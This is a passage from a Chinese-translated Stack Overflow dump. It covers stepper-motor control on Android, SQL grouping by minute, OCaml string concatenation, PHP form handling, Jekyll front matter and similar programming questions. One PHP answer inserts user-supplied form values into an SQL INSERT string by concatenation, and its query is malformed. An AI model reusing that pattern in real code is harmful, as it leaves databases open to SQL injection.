                                        // all others move 53 1/8 steps
            else motor_command = 2; 
            Toast.makeText(TestMotor4.this, "Motor_Command Set to: " + motor_command,Toast.LENGTH_SHORT).show();
            cup_count.setText(Integer.toString(traycount));         
        }
    });

    half = (Button) findViewById(R.id.btnhalfstep);
    half.setOnClickListener(new View.OnClickListener(){

        @Override
        public void onClick(View arg0) {
            // call method that moves motor one half step
            motor_command = 3;
                Toast.makeText(TestMotor4.this, "Motor_Command Set to: " + motor_command,Toast.LENGTH_SHORT).show();

        }
    });

}  //onCreate

/**
 * Called when the application is resumed (also when first started). Here is
 * where we'll create our IOIO thread.
 */
@Override
protected void onResume() {
    super.onResume();
    ioio_thread_ = new IOIOThread();
    ioio_thread_.start();
}

/**
 * Called when the application is paused. We want to disconnect with the
 * IOIO at this point, as the user is no longer interacting with our
 * application.
 */
@Override
protected void onPause() {
    super.onPause();
    ioio_thread_.abort();
    try {
        ioio_thread_.join();
    } catch (InterruptedException e) {
    }
}

/**
 * This is the thread that does the IOIO interaction.
 * 
 * It first creates a IOIO instance and wait for a connection to be
 * established. Then it starts doing the main work of opening the LED pin
 * and constantly updating it to match the toggle button's state.
 * 
 * Whenever a connection drops, it tries to reconnect, unless this is a
 * result of abort().
 */
class IOIOThread extends Thread {
    private IOIO ioio_;
    private boolean abort_ = false;

    DigitalOutput led;

    private DigitalOutput dir;
    private DigitalOutput stp;
    private DigitalOutput slp_,rst_, ms3, ms2, ms1,en_;
    private DigitalOutput led_;
    private DigitalOutput dish;
    private static final int STEP_WAIT = 5;

    /** Thread body. */
    @Override
    public void run() {
        super.run();
        while (true) {
            synchronized (this) {
                if (abort_) {
                    break;
                }
                ioio_ = IOIOFactory.create();
            }
            try {

                setText(R.string. wait_ioio);
                ioio_.waitForConnect();
                setText(R.string.ioio_connected);

                //IOIO pin setup:
                //DigitalOutput led = ioio_.openDigitalOutput(0, true);
                rst_ = ioio_.openDigitalOutput(13, true);   // /RESET   
                ms3  = ioio_.openDigitalOutput(14, true);   //  ms3  set step size     L L L full step
                ms2  = ioio_.openDigitalOutput(15, true);   //  ms2
                ms1  = ioio_.openDigitalOutput(16, true);   //  ms1                    H H H 1/16 step
                en_  = ioio_.openDigitalOutput(17, false);  // /enable 
                dir  = ioio_.openDigitalOutput(18, false);  //  DIRECTION -  set initial direction of motor rotation
                stp  = ioio_.openDigitalOutput(19, false);  //  STEP
                slp_ = ioio_.openDigitalOutput(20, true);       // /SLEEP  - 
                led  = ioio_.openDigitalOutput(IOIO.LED_PIN);
                dish = ioio_.openDigitalOutput(9, false);   // Dish - linear actuator activate signal   
                Log.d ("IOIOLooper setup", "Complete");
                int test = 0;

                Toast.makeText(TestMotor4.this, "Starting while loop",Toast.LENGTH_SHORT).show();
                while (true) {

                    led.write(!button_.isChecked());

                    switch(motor_command){

                        case 0:  // hold - do nothing for 5 sec.
                            this.timeout(100);

                            break;

                        case 1:   //full step on motor
                            full();
                            Log.d("STEPPER-FULL","Complete");
                            motor_command = 0;                  
                            break;

                        case 2:  // move motor 1 cup - (53) 1/8 steps
                            cup(53);
                            motor_command = 0; 
                            Log.d("STEPPER-CUP - 53","Complete" );
                            break;

                        case 3: // move motor 1 cup (54) 1/8 steps
                            cup(54);
                            motor_command = 0; 
                            Log.d("STEPPER-CUP - 54","Complete" );
                            break;

                        case 4: // dump scoop dish
                            dish.write(true);
                            //Toast.makeText(TestMotor4.this, "Dish set HIGH: ",Toast.LENGTH_SHORT).show();
                            this.timeout(5000);
                            dish.write(false);
                            //Toast.makeText(TestMotor4.this, "Dish set LOW " + motor_command,Toast.LENGTH_SHORT).show();
                            motor_command = 0;
                            break;

                    } // switch
                    sleep(10);

                }
            } catch (ConnectionLostException e) {
                setText(R.string.connectionLost);

            } catch (Exception e) {
                Log.e("TestMotor4", "Unexpected exception caught", e);
                ioio_.disconnect();
                break;
            } finally {
                    if (ioio_ != null) {
                        try {
                            ioio_.waitForDisconnect();
                        } catch (InterruptedException e) {
                        }
                    }
                    synchronized (this) {
                        ioio_ = null;
                    }
            }
        } // while(true)
    }// Run 

    /**
     * Abort the connection.
     * 
     * This is a little tricky synchronization-wise: we need to be handle
     * the case of abortion happening before the IOIO instance is created or
     * during its creation.
     */
    synchronized public void abort() {
        abort_ = true;
        if (ioio_ != null) {
            ioio_.disconnect();
        }
    }// abort

    /**
     * Set the text line on top of the screen.
     * 
     * @param id
     *            The string ID of the message to present.
     */
    private void setText(final int id) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                title_.setText(getString(id));
            }
        });
    } //setText

    public void full ()throws ConnectionLostException{
        // move motor 1 full step  (1.8 degrees)
        // requires stp to be LOW before entering method  - leaves stp LOW on exit of method
        try{
            en_.write(false);  // enable MC outputs
        // configure for full step  ( L L L)
            ms1.write(false);
            ms2.write(false);               
            ms3.write(false);
            Log.d("Set FULL", "L L L");

        //send step signal with LOW To HIGH transition
            stp.write(true);
            timeout(STEP_WAIT);
            stp.write(false);
            this.timeout(STEP_WAIT); 
        }catch(ConnectionLostException e) {
            //enableUi(false);
            Toast.makeText(TestMotor4.this, "IOIO Connection Lost ",Toast.LENGTH_LONG).show();
            throw e;
        }
    } // full

    public void cup(int num) throws ConnectionLostException{
        try{                    
            // set step size to 1/8 step
            ms1.write(true);
            ms2.write(true);
            ms3.write(false);
            Log.d("Set 1/8 step size ", "H H L");
            // set up wait for signals to stabilize
            this.timeout(STEP_WAIT); 

            //move motor 53 steps
            for (int i = 0; i<num; i++){
                stp.write(true);
                this.timeout(STEP_WAIT); 
                stp.write(false);
                this.timeout(STEP_WAIT); 
            }

        }catch (ConnectionLostException e){
            Toast.makeText(TestMotor4.this, "IOIO Connection Lost ",Toast.LENGTH_LONG).show();
            throw e;
        }
    }   //cup   
    private void timeout(int ms) {
        try {
        sleep(ms);
        } catch (InterruptedException e) {
        // Do nothing...
        }
        }

}  //IOIOThread 
```

}`

# sql - 时间范围内不同值的计数

> ID：14916844
> 
> 赞同：1
> 
> 时间：2013-02-17T00:43:55.433
> 
> 标签：sql, sql-server, select, count

我有一张这样的桌子

```
Time   |  user_id
12100  |    23
12100  |    23
12100  |    22
12100  |    19
12100  |    20
...
12160  |    273
12160  |    223
12160  |    1223
... 
```

时间以秒为单位。我正在寻找一种方法来在一分钟内获取唯一 user_id 的计数并让结果表看起来像这样

```
Minute  |  Count
  1     |  36
  2     |  100
... 
```

假设它从 12100 开始，所以第 1 分钟来自`12100 ~ 12159`，第 2 分钟来自`12160 to 12219`。

非常感谢您的帮助。

更新：（这是我尝试过的，但似乎包含重复项）

```
SELECT ROW_NUMBER() OVER (ORDER BY [Time]) AS [Row]
        , [Time]
        , COUNT(DISTINCT([user_id])) as [Count]
    INTO [table].[dbo].[temp]
  FROM [db].[dbo].[table]
  GROUP BY [Time]

  SELECT t.[Minute], SUM(t.[Count]) AS [Count]
    FROM
    (SELECT (ROW_NUMBER() OVER (ORDER BY [Row]) + 59)/60 AS [Minute]
            , SUM([Count]) AS [Count]
        FROM [db].[dbo].[temp]
        GROUP BY [Row]) AS t
    GROUP BY t.[Minute]
    ORDER BY t.[Minute]

DROP TABLE [db].[dbo].[temp] 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:51:11.327

创建一个表达式，将时间转换为您的目标分钟数并按以下方式分组：

```
select
    ((Time - 12000) / 60) + 1 as Minute,
    count(distinct user_id) as Count
from ... 
group by ((Time - 12000) / 60) + 1 
```

# ios - Xcode 4.6 在 Kobold2D 中导致 libobold2d-ios.a not found 错误

> ID：14916846
> 
> 赞同：1
> 
> 时间：2013-02-17T00:44:00.553
> 
> 标签：ios, objective-c, xcode, cocos2d-iphone, kobold2d

将 Xcode 升级到 4.6 并构建我的 Kobold2D 项目后，我收到以下错误：

```
ld: file not found: /Users/Jon/Library/Developer/Xcode/DerivedData/Kobold2D-
awxpgwvfoipnxpdyaptbdirnnfwq/Build/Intermediates/ArchiveIntermediates/Kodable-
iOS/BuildProductsPath/Release-iphoneos/libkobold2d-ios.a

clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

仅在使用 product>a​​rchive 构建 IPA 时才会发生。我可以直接在设备上运行没问题。这让我相信它是一个分发权限设置。[我已经对这里](http://www.kobold2d.com/pages/viewpage.action?pageId=919841)的错误进行了一些研究，并且还回顾了关于 SO 的类似问题。我知道问题出在哪里，但似乎没有一个解决方案可以解决问题。

这只发生在 Xcode 4.6 上。我之前已经能够构建 IPA 没有问题，甚至在 App Store 中有应用程序，所以我不知道是什么变化导致了这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T18:51:36.277

我今天想通了，所以我会为其他可能遇到此问题的人回答。

不知何故，该`libkobold2d-ios.a`文件（以及其他一些文件）已从构建阶段的“将二进制文件与库链接”部分中删除。我绝对没有手动执行此操作，因此我不知道为什么它们丢失了，但是当我将它们添加回来时，它起作用了。

快速说明 - 它们仍将显示为红色，因为它们必须在编译时构建。

# string - 在Ocaml中将字符串连接到整数

> ID：14916847
> 
> 赞同：10
> 
> 时间：2013-02-17T00:44:11.750
> 
> 标签：string, integer, ocaml, concatenation

我想要一个工作版本：

```
let x = "a" ^ 0;; 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-17T01:44:45.897

正如您无疑注意到的那样，您只能将字符串与其他字符串连接 - 而不是整数。因此，您必须先将整数转换为字符串，然后才能连接它。如果整数真的像您的示例中那样硬编码，您可以只写`"0"`而不是`0`（实际上在您的示例中，您可以只写`"a0"`而不连接任何东西）。

如果整数不是常量，可以使用`string_of_int`将其转换为字符串。所以这将起作用：

```
let x = "a" ^ string_of_int my_integer 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-17T22:48:56.030

您也可以使用通常的 printf 函数，但速度要[慢得多](http://www.lexifi.com/blog/note-about-performance-printf-and-format)：

```
let x = Printf.sprintf "a%d" my_integer 
```

# php - 执行 PHP 而不被重定向到动作链接文件？

> ID：14916851
> 
> 赞同：1
> 
> 时间：2013-02-17T00:44:29.493
> 
> 标签：php

如果我有一个将执行 PHP 脚本的提交按钮，我可以在不实际进入该页面的情况下执行它，即：process.php？我已经习惯了 JavaScript 能够做到这一点。

（为了记录，我说的是没有 AJAX，没有在另一个页面上重定向一次，不，我不是很有希望。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:46:41.617

您能够使用 JavaScript 执行此操作的原因是 JavaScript 可以在客户端的浏览器中执行。另一方面，PHP 总是在服务器上执行并将 HTML 返回给客户端。简而言之，不，你不能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:52:43.687

不使用 AJAX 的一种方法是将表单提交到不可见的 iframe，如下所示：

```
<form action="blah.php" target="theReallyCoolIframe">...</form>
<iframe name="theReallyCoolIframe></iframe> 
```

请注意，这并不是一个非常优雅的解决方案。总体而言，AJAX 是一个更好的解决方案，而且并不难——您应该研究一下[jQuery](http://jquery.com)及其[AJAX API](http://api.jquery.com/category/ajax/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T01:15:30.080

试试这个，如果你想使用 PHP 唯一的解决方案来解决你的问题。

```
<?php

function submit_form(){
    $host = "localhost";
    $user = "user";
    $password = "password";
    $database = "database";   

    $firstname  = filter_var($_POST['firstname'], FILTER_SANITIZE_STRING); 
    $lastname   = filter_var($_POST['lastname'], FILTER_SANITIZE_STRING); 
    $email  = filter_var(filter_var($_POST['email'],FILTER_SANITIZE_EMAIL),FILTER_VALIDATE_EMAIL);

    // open connection to database
    $link = mysqli_connect($host, $user, $password, $database);
        IF (!$link){
            echo ("Unable to connect to database!");
        }
        ELSE {
           //INSERT VALUES INTO DATABASE
           $query = "INSERT INTO users (firstname,lastname,email) 
VALUES('".$firstname."', '".$lastname."', '".$email."'";
           return mysqli_query($link,$query);

        }
//close connection to database
        mysqli_close($link);

    }

$form = <<<EODuserform
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>
        <title>Form</title>
    </head>
        <form action="{$_SERVER['PHP_SELF']}" method="POST" name="userform">
            <label for='first'>First Name:</label></br>
            <input type="text" name="firstname" id="first" maxlength="25" tabindex='1' VALUE="firstname" /></br>
            <label for='first'>Last Name:</label></br>
            <input type="text" name="lastname" id='lastname' maxlength="25" tabindex='2' VALUE="lastname" /></br>
            <label for='email'>E-mail:</label></br>
            <input type="text" name="email" id='email' maxlength="100" tabindex='3' VALUE="email" /></br>
            <input type="submit" class='button' name="submit" value="submit" tabindex='4' />
            </form>
    </body>
</html>
EODuserform;

IF(!IsSet($_POST['submit'])){ // Check if form is not send, if not display empty form.

    echo $form;
}

ELSE{
// in the case you want to send something to the database use 
submit_form();
echo ('Thanks for submitting your form');
}

?> 
```

这是一个非常基本的脚本，您可以在此页面上找到类似的脚本：[表单未保存到数据库](https://stackoverflow.com/questions/14595474/form-not-saving-to-database/14596512#14596512)

# java - 将 HTML 符号转换为 Java 符号

> ID：14916853
> 
> 赞同：0
> 
> 时间：2013-02-17T00:44:47.373
> 
> 标签：java, html, unicode

如何将 HTML 符号转换为 Java 符号？例如：我有`&#xe000` `String`并且我需要`char`像`\ue000`. 我需要做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:50:35.053

[`unescapeHtml4`](http://commons.apache.org/lang/api/org/apache/commons/lang3/StringEscapeUtils.html#unescapeHtml4%28java.lang.String%29)从 Apache Commons 工具包中尝试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T13:54:48.110

我在 Android 中找到了更好的解决方案。我只是调用静态方法`Html.fromHtml("&#xe000")`，而给定的结果是另一个`String`Java 源格式，如`\ue000`.

# ruby - jekyll/liquid 不解析 github 页面上的页面序言中的键/值字典

> ID：14916854
> 
> 赞同：1
> 
> 时间：2013-02-17T00:44:49.897
> 
> 标签：ruby, jekyll, liquid, github-pages

我有一个文件`test.md`：

```
---
layout: test
item: {"label":"value"}
---

This text should not appear 
```

和相应的文件`_layouts/test.html`：

```
<!DOCTYPE html>
<html>
<body>
  <h1>Hello world!</h1>
  The field <em>label</em> has value <em>{{ page.item.label }}</em>.
</body>
</html> 
```

正如预期的那样，在我的本地服务器上，我得到以下页面`_site/test.html`：

```
<!DOCTYPE html>
<html>
<body>
  <h1>Hello world!</h1>
  The field <em>label</em> has value <em>value</em>.
</body>
</html> 
```

在 github 上（参见[http://altomani.github.com/test.html](http://altomani.github.com/test.html)）结果是：

```
<p>This text should not appear</p> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T02:42:54.170

虽然我无法重现该问题，但我建议您遵循指南并`yaml`在序言中使用而不是在字典中使用：

```
---
layout : test
item : 
  label : value
--- 
```

这绝对应该有效。

# python - 使用python获取我的IP

> ID：14916859
> 
> 赞同：2
> 
> 时间：2013-02-17T00:45:36.577
> 
> 标签：python

我正在尝试使用 python 脚本用我的 IP 更新我的 rackspace dns。

当我在其中手动输入 IP 时，我的脚本可以工作，但当我从外部获取它时却没有，为什么？

这**工作：**

```
#!/usr/bin/env python
import clouddns
import requests
r= requests.get(r'http://curlmyip.com/')
ip= '4.4.4.4'
dns = clouddns.connection.Connection('******','********************')

domain = dns.get_domain(name='reazem.net')
record = domain.get_record(name='ssh.reazem.net')
record.update(data=ip, ttl=600) 
```

这**不是：**

```
#!/usr/bin/env python
import clouddns
import requests
r= requests.get(r'http://curlmyip.com/')
**ip= '{}'.format(r.text)**
dns = clouddns.connection.Connection('******','********************')

domain = dns.get_domain(name='reazem.net')
record = domain.get_record(name='ssh.reazem.net')
record.update(data=ip, ttl=600) 
```

注意：`print '{}'.format(r.text)`成功输出我的ip。

帮助你帮助我：我刚刚注意到`print '{}'.format(r.text)`增加了一个额外的行，我该如何避免呢？

对于那些感兴趣的人：[https ://github.com/rackspace/python-clouddns](https://github.com/rackspace/python-clouddns)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:47:30.163

尝试`ip = r.text.strip()`删除额外的换行符。

# assembly - 使用 Int 13H 读取磁盘参数

> ID：14916866
> 
> 赞同：0
> 
> 时间：2013-02-17T00:46:59.843
> 
> 标签：assembly, interrupt, hard-drive, bios

简单地说，我的目标是使用 Int 13h 来读取我的磁盘参数。

我知道这不能在 Windows 中直接完成，因为它本质上会拦截 BIOS 调用。

到目前为止，我的想法是我可以重写内存位置 0x7C00h 中的代码，并利用 Int 19h 进行热重启，这将跳转到现在覆盖的 0:7C00h，然后我将能够读取磁盘参数。

我在正确的轨道上吗？我觉得（我希望）我至少指向了正确的方向。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T02:49:03.287

进行热重启没有多大意义。

如果您的程序在 Windows 下运行，您将无法启动热重启，并且地址 0x7c00 不太可能映射到物理地址 0x7c00 的物理内存，这要归功于 Windows。

如果您的程序在 DOS 下运行，为什么不直接使用`int 13h`而无需重新启动？

如果你真的想在一个干净的系统（没有 DOS 或 Windows）上运行你的代码，写一个引导扇区，制作一张可引导的软盘或 CD 或闪存棒，然后从它引导。

# javascript - 使用 node.js + async 模块从同步回调中 创建一个同步循环

> ID：14916873
> 
> 赞同：1
> 
> 时间：2013-02-17T00:48:05.707
> 
> 标签：javascript, node.js, loops, async.js, node-async

流行的 node.js 模块[async](https://github.com/caolan/async)包括用于集合和控制流的函数，其中一些版本可以并行或串行操作。

但是其中我找不到一种方法来构建一个串联运行的循环。

我正在尝试与此伪代码相同的操作：

```
forever {
    l = getline();

    if (l === undefined) {
        break;
    } else {
        doStuff(l);
    }
} 
```

*   如果我希望`getLine()`并行调用所有调用，我可以使用`async.whilst`.
*   如果我想迭代一个数组而不是制作类似 a `for`or`while`循环的东西，我可以使用`async.eachSeries`.

**我可以使用什么来获取`series`控制流中的行为而不是集合迭代？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:35:00.687

`async.whilst` *确实*像您需要的那样连续执行其功能，因此您可以执行以下操作：

```
var l = getline();
async.whilst(
    function () { return l !== undefined; },
    function (callback) {
        doStuff(l);
        l = getline();
        callback(); // Check function isn't called again until callback is called
    },
    function (err) {
        // All done
    }
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T08:31:15.940

如果你想像同步代码一样连续执行循环，你应该使用 async.series 或 async.waterfall

> 系列（任务，[回调]）
> 
> 依次运行一系列函数，每个函数在前一个函数完成后运行。如果系列中的任何函数将错误传递给其回调，则不再运行任何函数，并且立即使用错误值调用系列的回调。任务完成后，结果将作为数组传递给最终回调。
> 
> 瀑布（任务，[回调]）
> 
> 依次运行一组函数，每个函数将其结果传递给数组中的下一个函数。但是，如果任何函数将错误传递给回调，则不会执行下一个函数，并且会立即调用带有错误的主回调。

瀑布链回调将一个的输出作为下一个的输入传递，系列只是按顺序执行。

# java - Edittext 到 int 崩溃

> ID：14916876
> 
> 赞同：0
> 
> 时间：2013-02-17T00:48:20.463
> 
> 标签：java, android, xml

所以基本上，我刚刚开始 android 开发，并且正在根据 youtube 上的教程构建一个应用程序。我决定走一点点，让它按照我想要的方式进行，现在我遇到了一个错误。

我想要做的是允许 EditText 决定这个计数器应用程序的增量。这是我的代码：

Java 活动：

```
 counter = 0;
        reset = (Button) findViewById(R.id.reset);
        addone = (Button) findViewById(R.id.add);
        takeOne = (Button) findViewById(R.id.take);
        tvCounter = (TextView) findViewById(R.id.fullscreen_content);
        incrementer = (EditText) findViewById(R.id.number);

        final int increment = Integer.parseInt(incrementer.getText().toString());

        addone.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                // TODO Auto-generated method stub
                counter += increment;
                tvCounter.setText("" + counter);
            }
        });

        takeOne.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                // TODO Auto-generated method stub
                counter -= increment;
                tvCounter.setText("" + counter);
            }
        });

        reset.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                // TODO Auto-generated method stub
                counter = 0;
                tvCounter.setText("" + counter);
            } 
```

XML:

```
 <Button
            android:id="@+id/add"
            style="?buttonBarButtonStyle"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Add One" />
        <Button
            android:id="@+id/take"
            style="?buttonBarButtonStyle"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Take One" />

        <Button
            android:id="@+id/reset"
            style="?buttonBarButtonStyle"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Reset" />
    </LinearLayout>

    <EditText
        android:id="@+id/number"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="center_horizontal"
        android:ems="10"
        android:inputType="number" >

        <requestFocus />
    </EditText> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:37:36.473

```
02-17 09:35:56.313: E/AndroidRuntime(3177): Caused by: java.lang.NumberFormatException: Invalid int: ""
02-17 09:35:56.313: E/AndroidRuntime(3177):     at java.lang.Integer.invalidInt(Integer.java:138)
02-17 09:35:56.313: E/AndroidRuntime(3177):     at java.lang.Integer.parseInt(Integer.java:359)
02-17 09:35:56.313: E/AndroidRuntime(3177):     at java.lang.Integer.parseInt(Integer.java:332)
02-17 09:35:56.313: E/AndroidRuntime(3177):     at 
```

这可能是错误并在这条线上发现

```
final int increment = Integer.parseInt(incrementer.getText().toString()); 
```

最好给你的`EditText`

```
 <EditText
        android:id="@+id/number"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="center_horizontal"
        android:ems="10"
        android:text="0" 
        android:inputType="number" > 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T01:29:36.050

它可能会崩溃，因为您的 EditText 的内容不是数字。假设这是您的 onCreate 方法，此时您不需要阅读编辑文本。在更新计数器之前，在按钮的 onClick 方法中解析 edittext 的内容。

此外，由于您不知道用户输入的文本类型，您应该在 parseInt 调用周围加上 try 和 catch 以防止应用程序在 EditText 不包含数字的情况下崩溃。

在 xml 文件中添加`android:text="1"`到您的 EditText。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T02:45:27.787

你得到了空的 EditText 并试图从“”中解析 Int，你会从 Integer.parseInt(“”) 方法中得到 NumberFormatException。

只需使用 try/catch 来捕获和处理异常。

```
final int increment;
try {
    increment = Integer.parseInt();
} catch (NumberFormatException e) {
    // Do what you want
} 
```

# scheme - 编写数据定义的麻烦

> ID：14916879
> 
> 赞同：0
> 
> 时间：2013-02-17T00:48:50.707
> 
> 标签：scheme, racket

我无法编写简单的数据定义。我需要知道您将如何为以下内容编写一个-

因此，个人资料由用户的姓名、位置和关系状态以及 lof（朋友列表）组成。朋友由姓名、位置和关系状态组成。您将如何编写数据定义并提供个人资料、朋友和 lof 的数据示例？

不知道是不是这样

```
;; A profile is one of: 
;; - empty 
;; - (make-user name location relationship-status LOF) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T03:35:51.090

您在数据定义方面遇到的“麻烦”究竟是什么？它们都非常简单，几乎是描述的直接翻译：

```
(define-struct profile (name location relationship-status lof))
(define-struct friend  (name location relationship-status))

(define lof
  (list
   (make-friend "Lucy" "Minneapolis" 'married)
   (make-friend "Schroeder" "Minneapolis" 'married)
   (make-friend "Patty" "Minneapolis" 'open-relationship)))

(make-profile "Charlie" "Minneapolis" 'widower lof) 
```

# java - 如何限制android中类的随机化

> ID：14916883
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:49:15.820
> 
> 标签：java, android, random

我正在尝试创建一个测验，其中我有 10 个问题（课程）随机化，但我只想显示 5 个问题（课程），然后分数将在测验结束时显示.. 我该怎么做？请.....或者是否可以限制android中的随机化？非常感谢你的帮忙..

这是代码，如果我开始播放，则必须进行随机化：

```
public class Whoami extends Activity {

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_whoami);

    Button bplay =(Button) findViewById(R.id.bplay);
     bplay.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {

            Random random = new Random();               
            random.nextInt(10);

                for (int i = 0; i < 5; i++);

                {

                    Intent newActivity1 = new Intent(Whoami.this,Question1.class);
                    startActivity(newActivity1);
                    finish();

                }
                {
                    Intent newActivity2 = new Intent(Whoami.this,Question2.class);     
                    startActivity(newActivity2);
                    finish();
                }
                {
                    Intent newActivity3 = new Intent(Whoami.this,Question3.class);     
                    startActivity(newActivity3);
                    finish();
                }
                {
                     Intent newActivity4 = new Intent(Whoami.this,Question4.class);     
                     startActivity(newActivity4);
                     finish();
                }
                {
                    Intent newActivity5 = new Intent(Whoami.this,Question5.class);     
                    startActivity(newActivity5);
                    finish();
                }
                {
                    Intent newActivity6 = new Intent(Whoami.this,Question6.class);     
                    startActivity(newActivity6);
                    finish();
                }
                {
                    Intent newActivity7 = new Intent(Whoami.this,Question7.class);     
                    startActivity(newActivity7);
                    finish();
                }
                {
                     Intent newActivity8 = new Intent(Whoami.this,Question8.class);     
                    startActivity(newActivity8);
                   finish();
                }
                {
                    Intent newActivity9 = new Intent(Whoami.this,Question9.class);     
                    startActivity(newActivity9);
                    finish();
                }
                {
                    Intent newActivity10 = new Intent(Whoami.this,Question10.class);     
                    startActivity(newActivity10);
                    finish();
                }
                Intent i = new Intent (Whoami.this, Score.class);
                startActivity(i);
                finish();
            }
     });
}; 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:16:32.110

It is never a good idea to hardcode content. I assume the questions only differ in terms of their wording. You should create one class for the question that is passed an integer indicating the question index (between 1 and 10) in its constructor.

Staying with your current class "system", you could do something like this inside the onClick method:

```
Random random = new Random();               
int questions = 10;
boolean used[] = new boolean[questions];
for (int i = 0; i < questions; i++) used[i] = false;

for (int i = 0; i < 5; i++) {
    int q;
    do { q = random.nextInt(questions); }
    while (used[q]);
    used[q] = true;

    Intent i = null;

    switch (q) {
    case 0: intent = new Intent(Whoami.this,Question1.class); break;
    case 1: intent = new Intent(Whoami.this,Question2.class); break;
    case 2: intent = new Intent(Whoami.this,Question3.class); break;
    case 3: intent = new Intent(Whoami.this,Question4.class); break;
    case 4: intent = new Intent(Whoami.this,Question5.class); break;
    case 5: intent = new Intent(Whoami.this,Question6.class); break;
    case 6: intent = new Intent(Whoami.this,Question7.class); break;
    case 7: intent = new Intent(Whoami.this,Question8.class); break;
    case 8: intent = new Intent(Whoami.this,Question9.class); break;
    case 9: intent = new Intent(Whoami.this,Question10.class); break;
    }

    startActivity(intent);
}

Intent i = new Intent (Whoami.this, Score.class);
startActivity(i);
finish(); 
```

Also, I would consider it a bad idea to start all the activities at once. Rather start them when the previous one has finished.

# php - 将两个 preg_match_all 合二为一

> ID：14916892
> 
> 赞同：1
> 
> 时间：2013-02-17T00:50:41.967
> 
> 标签：php, preg-match-all

`$fm`从`$parts`全部中提取`sum(anything)`：

```
preg_match_all('/sum\((.*?)\)/i', $fm, $parts, PREG_PATTERN_ORDER); 
```

怎么提取`avg(anything)`成`$fm`一样的`$parts`？我需要在哪里插入`OR`？

先感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:56:14.327

你会这样做：

```
preg_match_all('/(?:sum|avg)\((.*?)\)/i', $fm, $parts, PREG_PATTERN_ORDER); 
```

请注意，这`:?`是为了防止您不希望返回匹配的那部分。这基本上意味着忽略这些括号，因为它们并不是要捕获括号，而只是要搜索的可能匹配项的列表。

# php - 无法使用 exif_read_data 提取 $_FILES 的内容

> ID：14916893
> 
> 赞同：1
> 
> 时间：2013-02-17T00:51:00.563
> 
> 标签：php, arrays

我刚开始使用 php 并且在过去的几天里完全被难住了。我正在尝试提取和使用从 $_FILES 中的多个数组中提取的键值对。我敢肯定这是一个荒谬的愚蠢问题，但我很难过。如果我运行以下代码，我会得到以下结果。

```
$exif = exif_read_data('/uploads/'.$file['name'],  0, true);

  foreach($_FILES as $file){
  echo $file['name']  .  " :<br />\n";
  foreach ($exif as $key => $section) {
      foreach ($section as $name => $val) {

          echo "<pre>This is \$name" . $name ."<br>";
          echo "<pre>This is \$val" . $val ."<br>";
          }
        }
     } 
```

以下是输出：

上传图片

```
Image contains headers  
Across the Field - LK.jpg :
FILE.FileName: Across the Field - LK.jpg
FILE.FileDateTime: 1361055472  
FILE.FileSize: 294785  
FILE.FileType: 2  
FILE.MimeType: image/jpeg  
FILE.SectionsFound: ANY_TAG, IFD0, THUMBNAIL, EXIF  
COMPUTED.html: width="700" height="525"  
COMPUTED.Height: 525  
COMPUTED.Width: 700  
COMPUTED.IsColor: 1  
COMPUTED.ByteOrderMotorola: 0  
COMPUTED.ApertureFNumber: f/9.0  
COMPUTED.Copyright: Copyright 2010   
IFD0.ImageWidth: 1024  
IFD0.ImageLength: 768  
IFD0.BitsPerSample: Array  
IFD0.PhotometricInterpretation: 2  
IFD0.Model: NIKON D300  
IFD0.Orientation: 1  
IFD0.SamplesPerPixel: 3  
IFD0.XResolution: 720000/10000 
IFD0.YResolution: 720000/10000    
IFD0.ResolutionUnit: 2  
IFD0.Software: Adobe Photoshop CS5 Windows  
IFD0.DateTime: 2013:01:24 16:33:16  
IFD0.Artist: lken  
IFD0.Copyright: Copyright 2010   
IFD0.Exif_IFD_Pointer: 316  
THUMBNAIL.Compression: 6
THUMBNAIL.XResolution: 72/1  
THUMBNAIL.YResolution: 72/1 
THUMBNAIL.ResolutionUnit: 2  
THUMBNAIL.JPEGInterchangeFormat: 642  
THUMBNAIL.JPEGInterchangeFormatLength: 0  
EXIF.ExposureTime: 1/100  
